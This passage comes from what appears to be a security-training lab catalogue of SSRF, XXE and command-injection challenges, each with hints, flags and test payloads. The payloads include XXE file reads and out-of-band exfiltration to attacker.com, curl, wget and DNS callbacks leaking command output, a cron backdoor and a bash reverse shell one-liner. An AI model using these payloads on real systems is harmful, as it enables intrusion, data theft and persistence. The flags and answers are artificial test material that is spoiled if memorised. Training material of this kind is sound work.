        'title': 'SSRF + CSRF - Modify Admin Settings',
        'category': 'ssrf',
        'difficulty': 3,
        'points': 110,
        'description': 'Combine SSRF with CSRF to modify settings.',
        'scenario': 'Internal admin interface vulnerable to request forgery.',
        'vulnerableCode': 'requests.get(ssrf_url) + no CSRF tokens',
        'hint1': 'SSRF gets you to internal interface, add CSRF payload.',
        'hint2': 'Try POST requests to admin endpoints.',
        'hint3': 'Payload: http://localhost:8000/admin/change-password?pwd=hacked',
        'flag': 'FLAG{ssrf_csrf_111}',
        'testPayload': 'http://localhost:8000/admin/settings?disabled=true'
    },
    {
        'id': 112,
        'title': 'SSRF + XXE - Combined Attack',
        'category': 'ssrf',
        'difficulty': 4,
        'points': 150,
        'description': 'Combine SSRF with XXE for file disclosure.',
        'scenario': 'SSRF to internal XML service, then XXE in response.',
        'vulnerableCode': 'process_xml(requests.get(internal_url).text)',
        'hint1': 'Access internal XML service via SSRF.',
        'hint2': 'Then exploit XXE on the XML it returns.',
        'hint3': 'Use XXE payload within the SSRF request.',
        'flag': 'FLAG{ssrf_xxe_combined_112}',
        'testPayload': 'http://127.0.0.1:8000/xml?data=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    },
    {
        'id': 113,
        'title': 'SSRF + SQL Injection - Blind Attack',
        'category': 'ssrf',
        'difficulty': 4,
        'points': 150,
        'description': 'Use SSRF to access SQLi vulnerable database interface.',
        'scenario': 'Internal database service accepts HTTP queries.',
        'vulnerableCode': 'fetch_result(internal_database_url + query)',
        'hint1': 'SSRF to internal SQL service.',
        'hint2': 'Add SQLi payload in the query parameter.',
        'hint3': 'Payload: http://127.0.0.1:3306/query?sql=SELECT%201',
        'flag': 'FLAG{ssrf_sqli_blind_113}',
        'testPayload': 'http://127.0.0.1:3306/query?id=1\' OR 1=1 --'
    },
    {
        'id': 114,
        'title': 'SSRF + RCE - Command Execution',
        'category': 'ssrf',
        'difficulty': 4,
        'points': 150,
        'description': 'Execute commands on internal service via SSRF.',
        'scenario': 'Internal vulnerable application running.',
        'vulnerableCode': 'execute(get_from_internal_url())',
        'hint1': 'Find an internal service with RCE.',
        'hint2': 'Send malicious command through SSRF.',
        'hint3': 'Payload: http://127.0.0.1:5000/exec?cmd=id',
        'flag': 'FLAG{ssrf_rce_combined_114}',
        'testPayload': 'http://127.0.0.1:5000/exec?cmd=whoami'
    },
    {
        'id': 115,
        'title': 'SSRF - Time-Based Detection',
        'category': 'ssrf',
        'difficulty': 3,
        'points': 110,
        'description': 'Detect services via response time differences.',
        'scenario': 'Silent service failure vs actual service interaction.',
        'vulnerableCode': 'response_time = time_request(url)',
        'hint1': 'Open ports respond faster than closed ones.',
        'hint2': 'Measure response times to detect services.',
        'hint3': 'Payload: http://127.0.0.1:PORT (vary PORT)',
        'flag': 'FLAG{ssrf_timing_detection_115}',
        'testPayload': 'http://127.0.0.1:443'
    },
    {
        'id': 116,
        'title': 'SSRF - Gopher Protocol for Interaction',
        'category': 'ssrf',
        'difficulty': 3,
        'points': 110,
        'description': 'Use gopher:// to interact with services.',
        'scenario': 'Gopher protocol still supported by some apps.',
        'vulnerableCode': 'process_url(user_url)',
        'hint1': 'Gopher allows sending raw commands.',
        'hint2': 'Format: gopher://host:port/_command',
        'hint3': 'Payload: gopher://127.0.0.1:25/_mail from user@test.com',
        'flag': 'FLAG{ssrf_gopher_116}',
        'testPayload': 'gopher://127.0.0.1:25/_MAIL FROM test@test.com'
    },
    {
        'id': 117,
        'title': 'SSRF - DICT Protocol Enumeration',
        'category': 'ssrf',
        'difficulty': 3,
        'points': 110,
        'description': 'Enumerate services using DICT protocol.',
        'scenario': 'DICT protocol for service detection.',
        'vulnerableCode': 'handle_protocol(url)',
        'hint1': 'DICT protocol: dict://host:port/command',
        'hint2': 'Can enumerate services and protocols.',
        'hint3': 'Payload: dict://127.0.0.1:11211/stats',
        'flag': 'FLAG{ssrf_dict_117}',
        'testPayload': 'dict://127.0.0.1:11211/stats'
    },
    {
        'id': 118,
        'title': 'SSRF - FTP Bounce Attack',
        'category': 'ssrf',
        'difficulty': 3,
        'points': 110,
        'description': 'Use FTP server as proxy via SSRF.',
        'scenario': 'FTP bounce to access restricted services.',
        'vulnerableCode': 'fetch_via_url(url)',
        'hint1': 'FTP servers can bounce connections.',
        'hint2': 'Access other services through FTP.',
        'hint3': 'Payload: ftp://127.0.0.1:21',
        'flag': 'FLAG{ssrf_ftp_bounce_118}',
        'testPayload': 'ftp://127.0.0.1:21'
    },
    {
        'id': 119,
        'title': 'SSRF - URL Encoding Bypasses',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 85,
        'description': 'Bypass filters using URL encoding.',
        'scenario': 'Filter checks for localhost but misses encodings.',
        'vulnerableCode': 'if "localhost" in url: return; fetch(url)',
        'hint1': 'Try URL encoding: %6c (l), %6f (o).',
        'hint2': 'Hex encoding: 127.0.0.1 as 0x7f000001',
        'hint3': 'Payload: http://%31%32%37%2e%30%2e%30%2e%31',
        'flag': 'FLAG{ssrf_encoding_bypass_119}',
        'testPayload': 'http://%31%32%37%2e%30%2e%30%2e%31'
    },
    {
        'id': 120,
        'title': 'SSRF - DNS Rebinding Attack',
        'category': 'ssrf',
        'difficulty': 4,
        'points': 150,
        'description': 'DNS rebinding to bypass internal address filters.',
        'scenario': 'Application checks DNS initially then accesses.',
        'vulnerableCode': 'check_domain(url); fetch(url)',
        'hint1': 'Domains can resolve to different IPs over time.',
        'hint2': 'First lookup returns external, second returns internal.',
        'hint3': 'Payload: attacker-controlled domain with rebinding',
        'flag': 'FLAG{ssrf_dns_rebinding_120}',
        'testPayload': 'http://rebind.attacker.com'
    },

    # ==================== XXE (XML External Entity) Labs 121-140 ====================
    {
        'id': 121,
        'title': 'XXE - Basic File Disclosure',
        'category': 'xxe',
        'difficulty': 1,
        'points': 50,
        'description': 'Read local files using XXE.',
        'scenario': 'XML parser processes user input without restrictions.',
        'vulnerableCode': 'ET.fromstring(user_xml)',
        'hint1': 'Define external entity pointing to file.',
        'hint2': 'Use DOCTYPE to declare entity.',
        'hint3': 'Payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        'flag': 'FLAG{xxe_file_disclosure_121}',
        'testPayload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    },
    {
        'id': 122,
        'title': 'XXE - Billion Laughs DoS',
        'category': 'xxe',
        'difficulty': 2,
        'points': 75,
        'description': 'Cause DoS through entity expansion.',
        'scenario': 'XML parser vulnerable to exponential expansion.',
        'vulnerableCode': 'parse_xml_unsafe(input)',
        'hint1': 'Create self-referential entities that expand.',
        'hint2': 'Each level doubles the expansion.',
        'hint3': 'Use nested entities for exponential growth.',
        'flag': 'FLAG{xxe_billion_laughs_122}',
        'testPayload': '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>'
    },
    {
        'id': 123,
        'title': 'XXE - Windows UNC Path',
        'category': 'xxe',
        'difficulty': 2,
        'points': 75,
        'description': 'Access Windows UNC paths through XXE.',
        'scenario': 'Windows file shares accessible via UNC.',
        'vulnerableCode': 'process_xml_file(upload)',
        'hint1': 'Windows UNC paths: \\\\servername\\share',
        'hint2': 'XXE can access network shares.',
        'hint3': 'Payload: <!ENTITY xxe SYSTEM "file:////servername/share">',
        'flag': 'FLAG{xxe_windows_unc_123}',
        'testPayload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:////servername/share">]><foo>&xxe;</foo>'
    },
    {
        'id': 124,
        'title': 'XXE - Wrapper Protocol Access',
        'category': 'xxe',
        'difficulty': 2,
        'points': 75,
        'description': 'Use wrapper protocols to access files.',
        'scenario': 'PHP wrappers enabled in XML processing.',
        'vulnerableCode': 'simplexml_load_string($xml)',
        'hint1': 'PHP wrappers: php://, data://, glob://',
        'hint2': 'Can encode data in base64.',
        'hint3': 'Payload: php://filter/convert.base64-encode/resource=index.php',
        'flag': 'FLAG{xxe_wrapper_protocol_124}',
        'testPayload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>'
    },
    {
        'id': 125,
        'title': 'XXE - SVG Upload Vector',
        'category': 'xxe',
        'difficulty': 2,
        'points': 75,
        'description': 'XXE through SVG file upload.',
        'scenario': 'Application accepts SVG files.',
        'vulnerableCode': 'process_svg(uploaded_file)',
        'hint1': 'SVG is XML-based format.',
        'hint2': 'Can include XXE in SVG metadata.',
        'hint3': 'Payload: <svg><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]></svg>',
        'flag': 'FLAG{xxe_svg_upload_125}',
        'testPayload': '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'
    },
    {
        'id': 126,
        'title': 'XXE - Blind XXE via Error Messages',
        'category': 'xxe',
        'difficulty': 3,
        'points': 100,
        'description': 'Extract data through error-based XXE.',
        'scenario': 'Errors expose file content.',
        'vulnerableCode': 'try: parse(xml) except: return error_message',
        'hint1': 'Force XML errors to leak file content.',
        'hint2': 'Use invalid DTD to trigger errors.',
        'hint3': 'Payload: <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        'flag': 'FLAG{xxe_blind_error_126}',
        'testPayload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    },
    {
        'id': 127,
        'title': 'XXE - Out-of-Band Data Exfiltration',
        'category': 'xxe',
        'difficulty': 3,
        'points': 100,
        'description': 'Exfiltrate data via OOB channel.',
        'scenario': 'Data sent to external server via DNS/HTTP.',
        'vulnerableCode': 'process_external_entity(url)',
        'hint1': 'Create entity that makes external request.',
        'hint2': 'Use attacker-controlled server to receive data.',
        'hint3': 'Payload: <!ENTITY xxe SYSTEM "http://attacker.com/?data=">',
        'flag': 'FLAG{xxe_oob_exfiltration_127}',
        'testPayload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?file=">]><foo>&xxe;</foo>'
    },
    {
        'id': 128,
        'title': 'XXE - Parameter Entity XXE',
        'category': 'xxe',
        'difficulty': 3,
        'points': 100,
        'description': 'Use parameter entities for blind XXE.',
        'scenario': 'Parameter entities allow recursive definitions.',
        'vulnerableCode': 'parse_doctype(xml)',
        'hint1': 'Parameter entities: %name;',
        'hint2': 'Can nest multiple parameter entities.',
        'hint3': 'Payload: <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/?%file;">',
        'flag': 'FLAG{xxe_parameter_entity_128}',
        'testPayload': '<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/?%file;">'
    },
    {
        'id': 129,
        'title': 'XXE - Quadrature Recursive Entity',
        'category': 'xxe',
        'difficulty': 3,
        'points': 100,
        'description': 'Quadrature DoS with recursive entities.',
        'scenario': 'Exponential entity expansion attack.',
        'vulnerableCode': 'unsafe_xml_parse(user_data)',
        'hint1': 'Combine parameter entities with external entities.',
        'hint2': 'Can cause memory exhaustion.',
        'hint3': 'Payload uses nested entity references',
        'flag': 'FLAG{xxe_quadrature_129}',
        'testPayload': '<!ENTITY % start "<!ENTITY % goahead "file:///etc/passwd">">%start;'
    },
    {
        'id': 130,
        'title': 'XXE - JSON with XML Comment',
        'category': 'xxe',
        'difficulty': 2,
        'points': 80,
        'description': 'XXE in JSON processed as XML.',
        'scenario': 'Backend converts JSON to XML.',
        'vulnerableCode': 'convert_json_to_xml(input)',
        'hint1': 'JSON can be wrapped in XML tags.',
        'hint2': 'Add XXE after JSON content.',
        'hint3': 'Payload: {"data":"test"}<!-- XXE payload -->',
        'flag': 'FLAG{xxe_json_xml_130}',
        'testPayload': '<?xml version="1.0"?>{"data":"test"}<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    },
    {
        'id': 131,
        'title': 'XXE - libxml2 Specific',
        'category': 'xxe',
        'difficulty': 3,
        'points': 100,
        'description': 'XXE exploitation in libxml2 parser.',
        'scenario': 'Using libxml2 for XML processing.',
        'vulnerableCode': 'xmlParseFile(filename)',
        'hint1': 'libxml2 loads external entities by default.',
        'hint2': 'Need to disable DTD processing to prevent XXE.',
        'hint3': 'Payload: Standard XXE works with libxml2',
        'flag': 'FLAG{xxe_libxml2_131}',
        'testPayload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    },
    {
        'id': 132,
        'title': 'XXE - MSXML Parser Bypass',
        'category': 'xxe',
        'difficulty': 3,
        'points': 100,
        'description': 'Bypass XXE protections in MSXML.',
        'scenario': '.NET MSXML parser vulnerabilities.',
        'vulnerableCode': 'doc.Load(xmlString)',
        'hint1': 'MSXML has specific bypass techniques.',
        'hint2': 'ProhibitDtd property might not fully block XXE.',
        'hint3': 'Try different DOCTYPE declarations.',
        'flag': 'FLAG{xxe_msxml_bypass_132}',
        'testPayload': '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "file:///etc/hosts"><foo/>'
    },
    {
        'id': 133,
        'title': 'XXE - XInclude Attack',
        'category': 'xxe',
        'difficulty': 3,
        'points': 100,
        'description': 'Use XInclude to load external content.',
        'scenario': 'XInclude enabled in XML processor.',
        'vulnerableCode': 'process_xinclude(xml)',
        'hint1': 'XInclude: <xi:include href="..."/>',
        'hint2': 'Can include files from filesystem.',
        'hint3': 'Payload: <root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>',
        'flag': 'FLAG{xxe_xinclude_133}',
        'testPayload': '<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>'
    },
    {
        'id': 134,
        'title': 'XXE - Schema Validation Bypass',
        'category': 'xxe',
        'difficulty': 3,
        'points': 100,
        'description': 'Bypass XXE through schema validation.',
        'scenario': 'XXE payload hidden in XSD schema.',
        'vulnerableCode': 'validate_against_schema(xml)',
        'hint1': 'XXE can be in schema definitions.',
        'hint2': 'schemaLocation attribute can include XXE.',
        'hint3': 'Payload includes DOCTYPE with entity in XSD',
        'flag': 'FLAG{xxe_schema_validation_134}',
        'testPayload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root schemaLocation="http://attacker.com/schema.xsd">&xxe;</root>'
    },
    {
        'id': 135,
        'title': 'XXE - SOAP Message Injection',
        'category': 'xxe',
        'difficulty': 3,
        'points': 100,
        'description': 'XXE through SOAP message processing.',
        'scenario': 'Web service accepts SOAP requests.',
        'vulnerableCode': 'process_soap_message(request)',
        'hint1': 'SOAP is XML-based web service protocol.',
        'hint2': 'XXE payload in SOAP envelope.',
        'hint3': 'Payload: <?xml><soap:Envelope>...<!DOCTYPE...>',
        'flag': 'FLAG{xxe_soap_injection_135}',
        'testPayload': '<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="..."><soap:Body>&xxe;</soap:Body></soap:Envelope>'
    },
    {
        'id': 136,
        'title': 'XXE - Data URI Wrapper',
        'category': 'xxe',
        'difficulty': 2,
        'points': 80,
        'description': 'Use data:// URI in XXE.',
        'scenario': 'Inline data in XML entities.',
        'vulnerableCode': 'parse_entity_url(url)',
        'hint1': 'data: URIs can embed content inline.',
        'hint2': 'Use base64 encoded data.',
        'hint3': 'Payload: <!ENTITY xxe SYSTEM "data:text/plain;base64,PGZvbyAvPg==">',
        'flag': 'FLAG{xxe_data_uri_136}',
        'testPayload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data:text/plain;base64,aW50ZXJuYWwgZmlsZQ==">]><foo>&xxe;</foo>'
    },
    {
        'id': 137,
        'title': 'XXE - JAR Protocol Archive',
        'category': 'xxe',
        'difficulty': 3,
        'points': 100,
        'description': 'Access JAR files through XXE.',
        'scenario': 'Java application with JAR protocol support.',
        'vulnerableCode': 'load_java_xml(xml)',
        'hint1': 'JAR protocol: jar:file:///path/archive.jar!/entry.xml',
        'hint2': 'Can access files within JAR archives.',
        'hint3': 'Payload: <!ENTITY xxe SYSTEM "jar:file:///path.jar!/config.xml">',
        'flag': 'FLAG{xxe_jar_protocol_137}',
        'testPayload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///app.jar!/config.xml">]><foo>&xxe;</foo>'
    },
    {
        'id': 138,
        'title': 'XXE - Nested XML Comment Injection',
        'category': 'xxe',
        'difficulty': 2,
        'points': 80,
        'description': 'Bypass filters using nested comments.',
        'scenario': 'Filter blocks DOCTYPE but misses comments.',
        'vulnerableCode': 'if "DOCTYPE" in xml: reject()',
        'hint1': 'Comments can hide DOCTYPE.',
        'hint2': 'Try: <!-- DOCTYPE ...-->',
        'hint3': 'Payload uses comments to hide XXE',
        'flag': 'FLAG{xxe_comment_injection_138}',
        'testPayload': '<!-- <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> -->'
    },
    {
        'id': 139,
        'title': 'XXE - HTML Entity Encoding',
        'category': 'xxe',
        'difficulty': 2,
        'points': 80,
        'description': 'Encode XXE using HTML entities.',
        'scenario': 'Input sanitizer blocks certain characters.',
        'vulnerableCode': 'parse_sanitized_xml(input)',
        'hint1': 'HTML entities: &lt; &gt; &amp;',
        'hint2': 'Can encode XXE payload with entities.',
        'hint3': 'Payload: &lt;!DOCTYPE foo [...]&gt;',
        'flag': 'FLAG{xxe_entity_encoding_139}',
        'testPayload': '&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;'
    },
    {
        'id': 140,
        'title': 'XXE - HTTP Session Fixation',
        'category': 'xxe',
        'difficulty': 3,
        'points': 100,
        'description': 'Use XXE with HTTP session hijacking.',
        'scenario': 'XXE triggers HTTP call with malicious headers.',
        'vulnerableCode': 'fetch_and_parse(user_xml)',
        'hint1': 'XXE can make HTTP requests.',
        'hint2': 'Include session cookies in request.',
        'hint3': 'Payload: <!ENTITY xxe SYSTEM "http://attacker.com/?cookies=">',
        'flag': 'FLAG{xxe_session_fixation_140}',
        'testPayload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/exfil">]><foo>&xxe;</foo>'
    },

    # ==================== COMMAND INJECTION (Command Execution) Labs 141-160 ====================
    {
        'id': 141,
        'title': 'Command Injection - Basic Semicolon Separator',
        'category': 'command_injection',
        'difficulty': 1,
        'points': 50,
        'description': 'Execute second command using semicolon.',
        'scenario': 'User input concatenated into shell command.',
        'vulnerableCode': 'os.system("ping [host]")',
        'hint1': 'Semicolon separates commands.',
        'hint2': 'Try: 127.0.0.1; id',
        'hint3': 'Payload: 127.0.0.1;whoami',
        'flag': 'FLAG{cmd_injection_semicolon_141}',
        'testPayload': '127.0.0.1;whoami'
    },
    {
        'id': 142,
        'title': 'Command Injection - Pipe Operator',
        'category': 'command_injection',
        'difficulty': 1,
        'points': 50,
        'description': 'Chain commands using pipe operator.',
        'scenario': 'Command output piped to another command.',
        'vulnerableCode': 'subprocess.call("echo [user_input]")',
        'hint1': 'Pipe (|) sends output to next command.',
        'hint2': 'Try: test | cat /etc/passwd',
        'hint3': 'Payload: anything | whoami',
        'flag': 'FLAG{cmd_injection_pipe_142}',
        'testPayload': 'test|id'
    },
    {
        'id': 143,
        'title': 'Command Injection - Command Substitution',
        'category': 'command_injection',
        'difficulty': 1,
        'points': 50,
        'description': 'Execute commands using backticks.',
        'scenario': 'Shell processes command substitution.',
        'vulnerableCode': 'result = `nslookup [domain]`',
        'hint1': 'Backticks execute commands.',
        'hint2': 'Try: test`whoami`',
        'hint3': 'Payload: $(command) or `command`',
        'flag': 'FLAG{cmd_injection_substitution_143}',
        'testPayload': '`id`'
    },
    {
        'id': 144,
        'title': 'Command Injection - AND Operator (&&)',
        'category': 'command_injection',
        'difficulty': 1,
        'points': 50,
        'description': 'Execute second command if first succeeds.',
        'scenario': 'Conditional command execution.',
        'vulnerableCode': 'exec("grep "[pattern]" file.txt")',
        'hint1': 'AND (&&) runs second command if first succeeds.',
        'hint2': 'Try: test && id',
        'hint3': 'Payload: anything && whoami',
        'flag': 'FLAG{cmd_injection_and_144}',
        'testPayload': 'test&&id'
    },
    {
        'id': 145,
        'title': 'Command Injection - OR Operator (||)',
        'category': 'command_injection',
        'difficulty': 1,
        'points': 50,
        'description': 'Execute second command if first fails.',
        'scenario': 'Fallback command execution.',
        'vulnerableCode': 'run("ls " + dir)',
        'hint1': 'OR (||) runs second command if first fails.',
        'hint2': 'Try: false || id',
        'hint3': 'Payload: invalid || whoami',
        'flag': 'FLAG{cmd_injection_or_145}',
        'testPayload': 'nonexistent||id'
    },
    {
        'id': 146,
        'title': 'Command Injection - Newline Character',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Inject commands using newline character.',
        'scenario': 'Multi-line command execution.',
        'vulnerableCode': 'system(cmd_start [user_input] cmd_end)',
        'hint1': 'Newline (\\n) starts new command.',
        'hint2': 'Try: test\\nid',
        'hint3': 'Payload: %0aid in URL encoding',
        'flag': 'FLAG{cmd_injection_newline_146}',
        'testPayload': 'test%0aid'
    },
    {
        'id': 147,
        'title': 'Command Injection - Wildcard Expansion',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Abuse glob patterns for execution.',
        'scenario': 'Wildcard in command path.',
        'vulnerableCode': 'os.system("/usr/bin/s* " + arg)',
        'hint1': 'Wildcards expand to matching files.',
        'hint2': 'Try: /usr/bin/s* -l',
        'hint3': 'Payload: /usr/bin/wh* whoami',
        'flag': 'FLAG{cmd_injection_wildcard_147}',
        'testPayload': '/usr/bin/wh*'
    },
    {
        'id': 148,
        'title': 'Command Injection - Quote Escaping',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Escape quotes to break out of string.',
        'scenario': 'Quote-enclosed user input.',
        'vulnerableCode': 'cmd = \'echo "\' [user_input] \'"\' + \' > output.txt\'',
        'hint1': 'Backslash escapes quotes.',
        'hint2': 'Try: test\\" || id',
        'hint3': 'Payload: \\"; id; echo \\"',
        'flag': 'FLAG{cmd_injection_quote_escape_148}',
        'testPayload': '\\" || id; echo \\"'
    },
    {
        'id': 149,
        'title': 'Command Injection - Variable Expansion',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Use variable expansion to inject commands.',
        'scenario': 'Shell variables in command.',
        'vulnerableCode': 'os.system("echo $" + var_name)',
        'hint1': 'Dollar sign ($) expands variables.',
        'hint2': 'Try: $(id)',
        'hint3': 'Payload: $(whoami) or ${IFS}id',
        'flag': 'FLAG{cmd_injection_var_expansion_149}',
        'testPayload': '$(id)'
    },
    {
        'id': 150,
        'title': 'Command Injection - IFS (Internal Field Separator)',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Use IFS to bypass space filters.',
        'scenario': 'Spaces removed but IFS still works.',
        'vulnerableCode': 'if " " not in input: exec(cmd + input)',
        'hint1': 'IFS character separates fields like space.',
        'hint2': 'Default: space, tab, newline.',
        'hint3': 'Payload: cat${IFS}/etc/passwd',
        'flag': 'FLAG{cmd_injection_ifs_150}',
        'testPayload': 'cat${IFS}/etc/passwd'
    },
    {
        'id': 151,
        'title': 'Command Injection - Blind Time-Based',
        'category': 'command_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Detect command execution via timing.',
        'scenario': 'No output visible, use sleep command.',
        'vulnerableCode': 'subprocess.call("ping -c 1 " + host)',
        'hint1': 'Use sleep to detect execution.',
        'hint2': 'Try: 127.0.0.1; sleep 10',
        'hint3': 'Payload: test; sleep 5 &',
        'flag': 'FLAG{cmd_injection_time_based_151}',
        'testPayload': 'test;sleep 5'
    },
    {
        'id': 152,
        'title': 'Command Injection - DNS Exfiltration',
        'category': 'command_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Exfiltrate data via DNS requests.',
        'scenario': 'Blind command injection with DNS callback.',
        'vulnerableCode': 'resolve_domain(user_input)',
        'hint1': 'DNS requests can leak data.',
        'hint2': 'Try: nslookup $(whoami).attacker.com',
        'hint3': 'Payload: `id | xxd -p | tr -d \'\\n\'`.attacker.com',
        'flag': 'FLAG{cmd_injection_dns_exfil_152}',
        'testPayload': 'nslookup$(whoami).attacker.com'
    },
    {
        'id': 153,
        'title': 'Command Injection - HTTP Callback',
        'category': 'command_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Use HTTP callback to exfiltrate data.',
        'scenario': 'Blind RCE with HTTP request.',
        'vulnerableCode': 'system(cmd + user_input)',
        'hint1': 'curl or wget can send data to attacker.',
        'hint2': 'Try: curl http://attacker.com/?data=$(id)',
        'hint3': 'Payload: wget attacker.com/?$(whoami)',
        'flag': 'FLAG{cmd_injection_http_callback_153}',
        'testPayload': 'curl attacker.com/?data=$(id)'
    },
    {
        'id': 154,
        'title': 'Command Injection - Process Substitution',
        'category': 'command_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Use process substitution <() for injection.',
        'scenario': 'Advanced bash feature abuse.',
        'vulnerableCode': 'cat "[file]" | wc -l',
        'hint1': 'Process substitution: <(command)',
        'hint2': 'Try: <(id)',
        'hint3': 'Payload: wc -l <(id)',
        'flag': 'FLAG{cmd_injection_process_sub_154}',
        'testPayload': 'wc<(id)'
    },
    {
        'id': 155,
        'title': 'Command Injection - Here Document',
        'category': 'command_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Inject using here-document (<<).',
        'scenario': 'Multi-line input processing.',
        'vulnerableCode': 'bash -s " + input',
        'hint1': 'Here-doc: command << DELIMITER',
        'hint2': 'Allows multi-line input.',
        'hint3': 'Payload: bash << END\\nid\\nEND',
        'flag': 'FLAG{cmd_injection_heredoc_155}',
        'testPayload': 'bash<<END\nid\nEND'
    },
    {
        'id': 156,
        'title': 'Command Injection - Escaping Filter Bypass',
        'category': 'command_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Bypass blacklist with escape characters.',
        'scenario': 'Filter blocks certain characters.',
        'vulnerableCode': 'if not any(c in cmd for c in blacklist): exec(cmd)',
        'hint1': 'Backslash escapes next character.',
        'hint2': 'Try: wh\\oami',
        'hint3': 'Payload: /bin/sh with escaped characters',
        'flag': 'FLAG{cmd_injection_escape_bypass_156}',
        'testPayload': 'w\\h\\o\\a\\m\\i'
    },
    {
        'id': 157,
        'title': 'Command Injection - Unicode/Hex Encoding',
        'category': 'command_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Bypass filters using hex encoding.',
        'scenario': 'Input decoded before execution.',
        'vulnerableCode': 'eval(hex_decode(input))',
        'hint1': 'Hex representation: \\x64\\x6f (do)',
        'hint2': 'Command: echo -n "id" | xxd -p',
        'hint3': 'Payload with hex-encoded command.',
        'flag': 'FLAG{cmd_injection_hex_encoding_157}',
        'testPayload': '\\x69\\x64'
    },
    {
        'id': 158,
        'title': 'Command Injection - Cron Backdoor',
        'category': 'command_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Create cron job for persistent access.',
        'scenario': 'Command injection to modify crontab.',
        'vulnerableCode': 'system("crontab -l | " + user_input)',
        'hint1': 'Modify crontab for persistence.',
        'hint2': 'Try: echo "* * * * * /bin/sh" | crontab -',
        'hint3': 'Payload adds malicious cron entry.',
        'flag': 'FLAG{cmd_injection_cron_158}',
        'testPayload': 'echo "* * * * * id" | crontab -'
    },
    {
        'id': 159,
        'title': 'Command Injection - Reverse Shell',
        'category': 'command_injection',
        'difficulty': 4,
        'points': 150,
        'description': 'Establish reverse shell connection.',
        'scenario': 'Interactive shell back to attacker.',
        'vulnerableCode': 'os.system(user_cmd)',
        'hint1': 'nc (netcat) for reverse shell.',
        'hint2': 'Try: bash -i >& /dev/tcp/attacker/port 0>&1',
        'hint3': 'Payload: Bash reverse shell one-liner.',
        'flag': 'FLAG{cmd_injection_reverse_shell_159}',
        'testPayload': 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
    },
    {
        'id': 160,
        'title': 'Command Injection - Chained Exploitation',
        'category': 'command_injection',
        'difficulty': 4,
        'points': 150,
        'description': 'Chain multiple exploitation techniques.',
        'scenario': 'Complex bypass [persistence] exfiltration.',
        'vulnerableCode': 'vulnerable_to_all_above()',
        'hint1': 'Combine multiple injection vectors.',
        'hint2': 'Use encoding, chaining, callbacks.',
        'hint3': 'Payload chains: injectexecuteexfiltratepersist',
        'flag': 'FLAG{cmd_injection_chained_160}',
        'testPayload': 'test${IFS}&&$(curl attacker.com/?id=$(id))&&crontab -l'
    },
    
    # ==================== SSRF - Server-Side Request Forgery (Labs 101-120) ====================
    {
        'id': 101,
        'title': 'SSRF - Localhost Access',
        'category': 'ssrf',
        'difficulty': 1,
        'points': 75,
        'description': 'Access localhost from server.',
        'scenario': 'Image download functionality fetches from URL.',
        'vulnerableCode': 'requests.get(url); // No URL validation',
        'hint1': 'Try accessing http://localhost or http://127.0.0.1.',
        'hint2': 'Different ports may have services: 80, 8080, 3000, 5432.',
        'hint3': 'Payload: http://127.0.0.1:8080',
        'flag': 'FLAG{ssrf_localhost_101}',
        'testPayload': 'http://127.0.0.1:8080'
    },
    {
        'id': 102,
        'title': 'SSRF - Private Network Access',
        'category': 'ssrf',
        'difficulty': 1,
        'points': 75,
        'description': 'Access internal private network.',
